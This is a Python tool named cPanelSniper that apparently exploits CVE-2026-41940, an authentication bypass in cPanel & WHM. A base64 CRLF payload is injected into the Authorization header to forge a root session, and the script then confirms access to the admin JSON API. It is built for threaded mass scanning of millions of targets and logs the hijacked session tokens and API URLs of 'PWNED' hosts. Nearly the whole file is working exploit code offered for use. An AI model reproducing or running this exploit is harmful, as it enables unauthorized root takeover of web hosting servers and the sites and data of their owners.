#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cPanelSniper.py — CVE-2026-41940 cPanel & WHM Auth Bypass Scanner
TRUE STABLE — Zero memory usage for 10M+ targets
"""

import sys, os, re, json, ssl, signal, argparse, threading, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlsplit, quote, unquote, urlencode
from collections import defaultdict
import urllib.request, urllib.error

# ══════════════════════════════════════════════════════════════
#  COLORS
# ══════════════════════════════════════════════════════════════
class C:
    RED    = "\033[91m"; GREEN  = "\033[92m"; YELLOW = "\033[93m"
    BLUE   = "\033[94m"; PURPLE = "\033[95m"; CYAN   = "\033[96m"
    BOLD   = "\033[1m";  DIM    = "\033[2m";  RESET  = "\033[0m"
    ORANGE = "\033[38;5;208m"

LOG_LOCK   = threading.Lock()
PRINT_LOCK = threading.Lock()
STATS_LOCK = threading.Lock()

def ts():
    return datetime.now().strftime("%H:%M:%S")

def log(level, msg, target=""):
    icons = {
        "CRIT":  f"{C.RED}{C.BOLD}[CRIT]{C.RESET}",
        "HIGH":  f"{C.RED}[HIGH]{C.RESET}",
        "INFO":  f"{C.BLUE}[INFO]{C.RESET}",
        "OK":    f"{C.GREEN}[  OK]{C.RESET}",
        "ERR":   f"{C.DIM}[ ERR]{C.RESET}",
        "SKIP":  f"{C.DIM}[SKIP]{C.RESET}",
        "SCAN":  f"{C.PURPLE}[SCAN]{C.RESET}",
        "STEP":  f"{C.CYAN}[{level:>4}]{C.RESET}",
        "PWNED": f"{C.RED}{C.BOLD}[PWND]{C.RESET}",
        "WARN":  f"{C.YELLOW}[WARN]{C.RESET}",
        "API":   f"{C.ORANGE}[ API]{C.RESET}",
    }.get(level, f"[{level:>4}]")
    t = f" {C.DIM}{target}{C.RESET}" if target else ""
    with LOG_LOCK:
        print(f"{C.DIM}{ts()}{C.RESET} {icons} {msg}{t}", file=sys.stderr, flush=True)

def safe_print(msg):
    with PRINT_LOCK:
        print(msg, flush=True)

def banner():
    print(f"""{C.ORANGE}{C.BOLD}
   ██████╗██████╗  █████╗ ███╗  ██╗███████╗██╗
  ██╔════╝██╔══██╗██╔══██╗████╗ ██║██╔════╝██║
  ██║     ██████╔╝███████║██╔██╗██║█████╗  ██║
  ██║     ██╔═══╝ ██╔══██║██║╚████║██╔══╝  ██║
  ╚██████╗██║     ██║  ██║██║ ╚███║███████╗███████╗
   ╚═════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚══╝╚══════╝╚══════╝{C.RESET}
{C.BOLD}███████╗███╗  ██╗██╗██████╗ ███████╗██████╗{C.RESET}
{C.BOLD}██╔════╝████╗ ██║██║██╔══██╗██╔════╝██╔══██╗{C.RESET}
{C.BOLD}███████╗██╔██╗██║██║██████╔╝█████╗  ██████╔╝{C.RESET}
{C.BOLD}╚════██║██║╚████║██║██╔═══╝ ██╔══╝  ██╔══██╗{C.RESET}
{C.BOLD}███████║██║ ╚███║██║██║     ███████╗██║  ██║{C.RESET}
{C.BOLD}╚══════╝╚═╝  ╚══╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝{C.RESET}
{C.CYAN}  CVE-2026-41940 — cPanel & WHM Auth Bypass via CRLF Injection{C.RESET}
{C.DIM}  TRUE STABLE — Zero memory for 10M+ targets{C.RESET}
{C.RED}  In-The-Wild | CVSS 10.0 | Production Ready{C.RESET}
""")

# ══════════════════════════════════════════════════════════════
#  CRLF PAYLOAD
# ══════════════════════════════════════════════════════════════
PAYLOAD_B64 = (
    "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
    "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
)

# ══════════════════════════════════════════════════════════════
#  HTTP ENGINE
# ══════════════════════════════════════════════════════════════
class _SSLCtx:
    _ctx = None
    @classmethod
    def get(cls):
        if not cls._ctx:
            c = ssl.create_default_context()
            c.check_hostname = False
            c.verify_mode    = ssl.CERT_NONE
            try: c.set_ciphers("DEFAULT:@SECLEVEL=1")
            except: pass
            cls._ctx = c
        return cls._ctx

BASE_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
           "AppleWebKit/537.36 (KHTML, like Gecko) "
           "Chrome/146.0.0.0 Safari/537.36")

class R:
    def __init__(self, status, body, headers, url, raw_cookies=""):
        self.status = status
        self.body = body
        self.headers = headers
        self.url = url
        self.raw_cookies = raw_cookies

    def h(self, k, default=""):
        return self.headers.get(k.lower(), default)

    def location(self):
        return self.h("location")

    def raw_cookie(self, name):
        for line in self.raw_cookies.split("\n"):
            if line.lower().startswith(name.lower() + "="):
                v = line.split("=", 1)[1].split(";", 1)[0].strip()
                return v
        return ""

class _NoRedir(urllib.request.HTTPErrorProcessor):
    def http_response(self, req, r): return r
    https_response = http_response

def _do(url, method="GET", extra_headers=None, data=None, timeout=15,
        follow=False, canonical_host=None):
    try:
        parsed = urlsplit(url)
        h = {
            "User-Agent": BASE_UA,
            "Accept": "*/*",
            "Connection": "close",
        }
        if canonical_host:
            port = parsed.port or (443 if parsed.scheme=="https" else 80)
            h["Host"] = f"{canonical_host}:{port}" if port not in (80,443) else canonical_host
        if extra_headers:
            h.update(extra_headers)

        body_bytes = None
        if data:
            if isinstance(data, dict):
                body_bytes = urlencode(data).encode()
                h.setdefault("Content-Type", "application/x-www-form-urlencoded")
            elif isinstance(data, str):
                body_bytes = data.encode()
            else:
                body_bytes = data

        opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=_SSLCtx.get()),
            _NoRedir() if not follow else urllib.request.HTTPSHandler(context=_SSLCtx.get()))
        opener.addheaders = []

        req = urllib.request.Request(url, data=body_bytes,
                                     headers=h, method=method)
        with opener.open(req, timeout=timeout) as resp:
            body_bytes_out = resp.read()
            body = body_bytes_out.decode("utf-8", errors="replace")
            rh = {}
            raw_ck = []
            for k, v in resp.headers.items():
                rh[k.lower()] = v
                if k.lower() == "set-cookie":
                    raw_ck.append(v)
            return R(resp.status, body, rh, resp.url, "\n".join(raw_ck))
    except urllib.error.HTTPError as e:
        try: body = e.read().decode("utf-8", errors="replace")
        except: body = ""
        rh = {k.lower(): v for k,v in e.headers.items()} if hasattr(e,"headers") else {}
        raw_ck = []
        if hasattr(e, "headers"):
            for k,v in e.headers.items():
                if k.lower() == "set-cookie":
                    raw_ck.append(v)
        return R(e.code, body, rh, url, "\n".join(raw_ck))
    except Exception as ex:
        return R(0, str(ex), {}, url, "")

# ══════════════════════════════════════════════════════════════
#  STATS & TRACKING
# ══════════════════════════════════════════════════════════════
class Stats:
    def __init__(self):
        self.scanned = 0
        self.found = 0
        self.errors = 0
        self.start_time = None

    def add_scanned(self):
        with STATS_LOCK:
            self.scanned += 1

    def add_found(self):
        with STATS_LOCK:
            self.found += 1

    def add_error(self):
        with STATS_LOCK:
            self.errors += 1

    def get(self):
        with STATS_LOCK:
            elapsed = time.time() - self.start_time if self.start_time else 0
            return {
                "scanned": self.scanned,
                "found": self.found,
                "errors": self.errors,
                "elapsed": elapsed
            }

STATS = Stats()

# ══════════════════════════════════════════════════════════════
#  FINDINGS STORE (thread-safe, auto-save)
# ══════════════════════════════════════════════════════════════
class FindingsStore:
    def __init__(self, output_file=None, save_interval=60):
        self._f = []
        self._seen = set()
        self._lock = threading.Lock()
        self._output_file = output_file
        self._save_interval = save_interval
        self._last_save = time.time()
        self._total_added = 0

    def add(self, f):
        k = f"{f.get('target','')}"
        with self._lock:
            if k in self._seen: return
            self._seen.add(k)
            self._f.append(f)
            self._total_added += 1

            if self._output_file and (time.time() - self._last_save) > self._save_interval:
                self._save_to_disk()

    def _save_to_disk(self):
        if not self._output_file:
            return
        try:
            os.makedirs(os.path.dirname(self._output_file) if os.path.dirname(self._output_file) else ".", exist_ok=True)
            with open(self._output_file, "w", encoding="utf-8") as f:
                json.dump({"scanner":"cPanelSniper PRO","cve":"CVE-2026-41940",
                           "timestamp": datetime.now().isoformat(),
                           "findings": self._f}, f, indent=2, ensure_ascii=False)
            self._last_save = time.time()
        except Exception as e:
            log("WARN", f"Save failed: {e}")

    def all(self):
        with self._lock:
            return list(self._f)

    def finalize(self):
        self._save_to_disk()

STORE = FindingsStore()

# ══════════════════════════════════════════════════════════════
#  TARGET PARSING
# ══════════════════════════════════════════════════════════════
def parse_target(url: str) -> tuple:
    if "://" not in url:
        url = "https://" + url
    u = urlsplit(url.rstrip("/"))
    scheme = u.scheme or "https"
    host   = u.hostname or url
    port   = u.port or 2087
    return scheme, host, port

def build_url(scheme, host, port, path):
    if (scheme == "https" and port == 443) or (scheme == "http" and port == 80):
        return f"{scheme}://{host}{path}"
    return f"{scheme}://{host}:{port}{path}"

# ══════════════════════════════════════════════════════════════
#  EXPLOIT STAGES
# ══════════════════════════════════════════════════════════════
def stage0_canonical(scheme, host, port, timeout) -> str:
    url  = build_url(scheme, host, port, "/openid_connect/cpanelid")
    resp = _do(url, timeout=timeout, follow=False)
    loc  = resp.location()
    m    = re.match(r"^https?://([^:/]+)", loc)
    if m:
        return m.group(1)
    return host

def stage1_preauth(scheme, host, port, canonical, timeout) -> str:
    url  = build_url(scheme, host, port, "/login/?login_only=1")
    resp = _do(url, method="POST",
               data={"user": "root", "pass": "wrong"},
               timeout=timeout,
               canonical_host=canonical)

    if resp.status not in (200, 401):
        return None

    raw_ck = resp.raw_cookie("whostmgrsession")
    if not raw_ck:
        raw_ck = resp.h("set-cookie")
        m = re.search(r'whostmgrsession=([^;,\s]+)', raw_ck, re.IGNORECASE)
        raw_ck = m.group(1) if m else ""

    if not raw_ck:
        return None

    decoded = unquote(raw_ck)
    if "," in decoded:
        session_base = decoded.split(",", 1)[0]
    else:
        session_base = decoded

    return session_base

def stage2_inject(scheme, host, port, canonical, session_base, timeout) -> str:
    cookie_enc = quote(session_base)
    url  = build_url(scheme, host, port, "/")
    resp = _do(url, method="GET",
               extra_headers={
                   "Authorization": f"Basic {PAYLOAD_B64}",
                   "Cookie":        f"whostmgrsession={cookie_enc}",
               },
               timeout=timeout,
               canonical_host=canonical)

    loc = resp.location()
    m   = re.search(r"/cpsess(\d{10})", loc)
    if not m:
        return None

    token = f"/cpsess{m.group(1)}"
    return token

def stage3_propagate(scheme, host, port, canonical, session_base, timeout) -> bool:
    cookie_enc = quote(session_base)
    url  = build_url(scheme, host, port, "/scripts2/listaccts")
    resp = _do(url, method="GET",
               extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
               timeout=timeout,
               canonical_host=canonical)

    body = resp.body or ""
    if resp.status == 401 and any(x in body for x in ["Token denied", "WHM Login", "login"]):
        return True

    if resp.status in (200, 301, 302, 307):
        return True

    return True

def stage4_verify(scheme, host, port, canonical, session_base, token, timeout) -> dict:
    cookie_enc = quote(session_base)
    url  = build_url(scheme, host, port, f"{token}/json-api/version")
    resp = _do(url, method="GET",
               extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
               timeout=timeout,
               canonical_host=canonical)

    body = (resp.body or "").strip()

    if resp.status == 200 and '"version"' in body:
        version = ""
        m = re.search(r'"version"\s*:\s*"([^"]+)"', body)
        if m:
            version = m.group(1)
        return {"confirmed": True, "version": version, "body": body[:600]}

    if resp.status in (500, 503) and "License" in body:
        return {"confirmed": True, "version": "unknown (license-gated)", "body": body[:300]}

    return {"confirmed": False}

# ══════════════════════════════════════════════════════════════
#  MAIN SCANNER
# ══════════════════════════════════════════════════════════════
def scan(target: str, args) -> dict:
    try:
        if "://" not in target:
            target = "https://" + target
        target = target.rstrip("/")
        result = {"target": target, "vuln": False}

        scheme, host, port = parse_target(target)
        timeout = args.timeout

        canonical = args.hostname or stage0_canonical(scheme, host, port, timeout)
        if not canonical:
            canonical = host

        session_base = stage1_preauth(scheme, host, port, canonical, timeout)
        if not session_base:
            return result

        token = stage2_inject(scheme, host, port, canonical, session_base, timeout)
        if not token:
            return result

        stage3_propagate(scheme, host, port, canonical, session_base, timeout)

        verify = stage4_verify(scheme, host, port, canonical,
                               session_base, token, timeout)

        if not verify.get("confirmed"):
            return result

        version = verify.get("version", "unknown")

        log("PWNED", f"CVE-2026-41940 CONFIRMED", target)

        finding = {
            "severity":   "CRIT",
            "title":      "CVE-2026-41940 — cPanel & WHM Authentication Bypass",
            "target":     target,
            "canonical":  canonical,
            "session":    session_base,
            "token":      token,
            "version":    version,
            "api_url":    build_url(scheme, host, port, f"{token}/json-api/version"),
            "cve":        "CVE-2026-41940",
            "cvss":       "10.0",
            "timestamp":  datetime.now().isoformat(),
        }
        STORE.add(finding)
        STATS.add_found()
        result["vuln"] = True
        result["finding"] = finding

        return result

    except Exception as e:
        STATS.add_error()
        return {"target": target, "vuln": False, "error": str(e)}

    finally:
        STATS.add_scanned()

# ══════════════════════════════════════════════════════════════
#  STREAMING TARGET READER (ZERO MEMORY)
# ══════════════════════════════════════════════════════════════
def stream_targets_file(file_path, skip_processed=False, processed_file=None):
    """Stream targets from file, line by line, zero memory usage"""
    seen = set()

    # Load already processed targets for recovery
    if skip_processed and processed_file and os.path.exists(processed_file):
        try:
            with open(processed_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    target = line.strip()
                    if target:
                        seen.add(target)
            log("INFO", f"Loaded {len(seen)} already processed targets")
        except Exception as e:
            log("WARN", f"Could not load processed file: {e}")

    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            # Extract URL
            m = re.search(r'(https?://[a-zA-Z0-9._:/?&=%-]+)', line)
            if m:
                target = m.group(1).rstrip("[].,")
            else:
                # Try IP:PORT format
                m2 = re.match(r'^(\d{1,3}(?:\.\d{1,3}){3}):?(\d+)?$', line)
                if m2:
                    port = m2.group(2) or "2087"
                    target = f"https://{m2.group(1)}:{port}"
                else:
                    continue

            if target and target not in seen:
                seen.add(target)
                yield target

# ══════════════════════════════════════════════════════════════
#  STREAMING BULK SCANNER
# ══════════════════════════════════════════════════════════════
def streaming_scan(targets_stream, args):
    """Stream scan with zero memory usage"""
    total_scanned = 0
    active_targets = []

    STATS.start_time = time.time()
    print(f"{C.CYAN}[INFO]{C.RESET} Starting streaming scan...")

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {}
        completed = 0

        for target in targets_stream:
            # Add new target to pool
            future = executor.submit(scan, target, args)
            futures[future] = target
            active_targets.append(target)

            # Process completed futures
            while len(futures) >= args.threads * 2:
                for f in list(futures.keys()):
                    if f.done():
                        completed += 1
                        total_scanned += 1
                        del futures[f]

                show_progress(total_scanned, None)
                time.sleep(0.1)

        # Wait for remaining futures
        for future in as_completed(futures):
            completed += 1
            total_scanned += 1
            show_progress(total_scanned, None)

    print(f"\n{C.GREEN}[DONE]{C.RESET} Streaming scan complete!\n")

# ══════════════════════════════════════════════════════════════
#  PROGRESS DISPLAY
# ══════════════════════════════════════════════════════════════
def show_progress(scanned, total):
    stats = STATS.get()
    elapsed = stats["elapsed"]
    rate = stats["scanned"] / elapsed if elapsed > 0 else 0
    eta_str = "calculating..." if total and rate > 0 else "unknown"

    if total and rate > 0:
        eta = (total - scanned) / rate
        if eta > 3600:
            eta_str = f"{eta/3600:.1f}h"
        elif eta > 60:
            eta_str = f"{eta/60:.1f}m"
        else:
            eta_str = f"{eta:.0f}s"

    total_str = f"/{total}" if total else ""

    sys.stderr.write(f"\r{C.CYAN}[PROG]{C.RESET} "
                     f"Scanned: {C.GREEN}{scanned}{total_str}{C.RESET} | "
                     f"Found: {C.RED}{stats['found']}{C.RESET} | "
                     f"Errors: {C.YELLOW}{stats['errors']}{C.RESET} | "
                     f"Rate: {rate:.1f}/s | "
                     f"ETA: {eta_str}")
    sys.stderr.flush()

# ══════════════════════════════════════════════════════════════
#  SUMMARY
# ══════════════════════════════════════════════════════════════
def print_summary(elapsed, total):
    findings = STORE.all()
    stats = STATS.get()
    W = 70
    print(f"\n{C.BOLD}{'═'*W}{C.RESET}")
    print(f"{C.BOLD}  cPanelSniper PRO — Scan Complete{C.RESET}")
    print(f"  {C.DIM}Time: {elapsed:.1f}s  ·  Targets: {total}{C.RESET}")
    print(f"  {C.DIM}Scanned: {stats['scanned']}  ·  Found: {stats['found']}  ·  Errors: {stats['errors']}{C.RESET}")
    print(f"  {C.DIM}Rate: {stats['scanned']/elapsed:.1f} targets/sec{C.RESET}" if elapsed > 0 else "")
    print(f"{'─'*W}")
    if not findings:
        print(f"  {C.DIM}No vulnerable targets found.{C.RESET}")
    else:
        print(f"\n  {C.RED}{C.BOLD}⚡ {len(findings)} VULNERABLE TARGET(S){C.RESET}\n")
        for f in findings:
            print(f"  {C.RED}{C.BOLD}Target :{C.RESET} {f['target']}")
            print(f"  {C.CYAN}Version :{C.RESET} {f['version']}")
            print(f"  {C.CYAN}Token   :{C.RESET} {f['token']}")
            print(f"  {C.GREEN}API URL :{C.RESET} {f['api_url']}\n")
    print(f"{'═'*W}{C.RESET}\n")

# ══════════════════════════════════════════════════════════════
#  CLI
# ══════════════════════════════════════════════════════════════
def main():
    banner()
    p = argparse.ArgumentParser(
        description="cPanelSniper PRO — CVE-2026-41940 zero-memory scanner",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Examples:
  python3 cPanelSniper.py -u https://target.com:2087
  python3 cPanelSniper.py -l targets.txt -t 50 -o results.json
  python3 cPanelSniper.py -l targets.txt -t 30 -o results.json --resume
        """
    )
    tg = p.add_argument_group("Target")
    tg.add_argument("-u","--url",      help="Single target URL")
    tg.add_argument("-l","--list",     help="File with URLs (one per line)")

    sg = p.add_argument_group("Scan")
    sg.add_argument("-t","--threads",  type=int, default=20, help="Threads (default: 20)")
    sg.add_argument("--timeout",       type=int, default=15, help="Timeout seconds (default: 15)")
    sg.add_argument("--resume",        action="store_true", help="Resume from previous scan")

    og = p.add_argument_group("Output")
    og.add_argument("-o","--output",   help="Save results to JSON file")
    og.add_argument("--no-color",      action="store_true", help="Disable ANSI colors")
    og.add_argument("--save-interval", type=int, default=60, help="Save results every N seconds")

    args = p.parse_args()

    if args.no_color:
        for a in [x for x in dir(C) if not x.startswith("_")]:
            setattr(C, a, "")

    if args.output:
        STORE._output_file = args.output
        STORE._save_interval = args.save_interval

    print(f"{C.PURPLE}  Configuration:{C.RESET}")
    print(f"   Threads    : {args.threads}")
    print(f"   Timeout    : {args.timeout}s")
    print(f"   Resume     : {args.resume}")
    print(f"   Output     : {args.output or 'stdout'}")
    print()

    t0 = time.time()

    if args.url:
        STATS.start_time = time.time()
        scan(args.url, args)
        if args.output:
            STORE.finalize()
        print_summary(time.time()-t0, 1)
        sys.exit(0)

    if args.list and not os.path.exists(args.list):
        log("ERR", f"File not found: {args.list}")
        sys.exit(1)

    if args.list:
        # STREAMING MODE - zero memory
        processed_file = args.output.replace('.json', '.processed') if args.output else None
        targets_stream = stream_targets_file(args.list, skip_processed=args.resume,
                                             processed_file=processed_file)
        streaming_scan(targets_stream, args)
    else:
        p.print_help()
        sys.exit(1)

    if args.output:
        STORE.finalize()

    stats = STATS.get()
    print_summary(time.time()-t0, stats['scanned'])

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.RED}[!] Interrupted. Saving results...{C.RESET}")
        if STORE._output_file:
            STORE.finalize()
        stats = STATS.get()
        print_summary(time.time() - (STATS.start_time or time.time()), stats['scanned'])
        sys.exit(0)
